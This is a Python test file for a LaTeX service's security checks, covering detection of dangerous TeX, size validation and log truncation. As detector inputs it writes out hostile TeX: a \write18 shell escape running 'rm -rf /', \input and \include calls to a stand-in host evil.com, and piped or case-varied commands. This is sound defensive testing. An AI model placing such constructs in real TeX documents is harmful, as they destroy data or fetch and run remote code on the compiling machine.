import pytest

from app.security import contains_dangerous_content, validate_tex_content, truncate_log
from app.models import ErrorType


class TestContainsDangerousContent:
    def test_clean_tex_returns_none(self):
        tex = r"""
        \documentclass{article}
        \begin{document}
        Hello, World!
        \end{document}
        """
        assert contains_dangerous_content(tex) is None

    def test_detects_write18(self):
        tex = r"\write18{rm -rf /}"
        result = contains_dangerous_content(tex)
        assert result is not None
        assert "write18" in result.lower()

    def test_detects_immediate_write18(self):
        tex = r"\immediate\write18{ls}"
        result = contains_dangerous_content(tex)
        assert result is not None

    def test_detects_input_http(self):
        tex = r"\input{http://evil.com/malware.tex}"
        result = contains_dangerous_content(tex)
        assert result is not None
        assert "http" in result.lower()

    def test_detects_input_http_with_spaces(self):
        tex = r"\input { http://evil.com/malware.tex }"
        result = contains_dangerous_content(tex)
        assert result is not None

    def test_detects_include_http(self):
        tex = r"\include{http://evil.com/malware}"
        result = contains_dangerous_content(tex)
        assert result is not None

    def test_detects_pipe_input(self):
        tex = r'\input|"ls -la"'
        result = contains_dangerous_content(tex)
        assert result is not None

    def test_case_insensitive(self):
        tex = r"\WRITE18{whoami}"
        result = contains_dangerous_content(tex)
        assert result is not None


class TestValidateTexContent:
    def test_valid_tex_returns_none(self):
        tex = r"\documentclass{article}\begin{document}Test\end{document}"
        result = validate_tex_content(tex, max_size_bytes=1_000_000)
        assert result is None

    def test_oversized_tex_returns_error(self):
        tex = "x" * 2_000_000  # 2MB
        result = validate_tex_content(tex, max_size_bytes=1_000_000)
        assert result is not None
        error_type, message = result
        assert error_type == ErrorType.VALIDATION_ERROR
        assert "size" in message.lower()

    def test_dangerous_tex_returns_error(self):
        tex = r"\write18{danger}"
        result = validate_tex_content(tex, max_size_bytes=1_000_000)
        assert result is not None
        error_type, message = result
        assert error_type == ErrorType.DANGEROUS_CONTENT

    def test_exactly_max_size_is_valid(self):
        tex = "x" * 1_000_000
        result = validate_tex_content(tex, max_size_bytes=1_000_000)
        assert result is None


class TestTruncateLog:
    def test_short_log_unchanged(self):
        log = "Short log"
        result = truncate_log(log, max_chars=100)
        assert result == log

    def test_long_log_truncated(self):
        log = "x" * 1000
        result = truncate_log(log, max_chars=100)
        assert len(result) < len(log)
        assert "truncated" in result.lower()

    def test_exact_max_unchanged(self):
        log = "x" * 100
        result = truncate_log(log, max_chars=100)
        assert result == log

    def test_preserves_beginning(self):
        log = "IMPORTANT: " + "x" * 1000
        result = truncate_log(log, max_chars=100)
        assert result.startswith("IMPORTANT:")
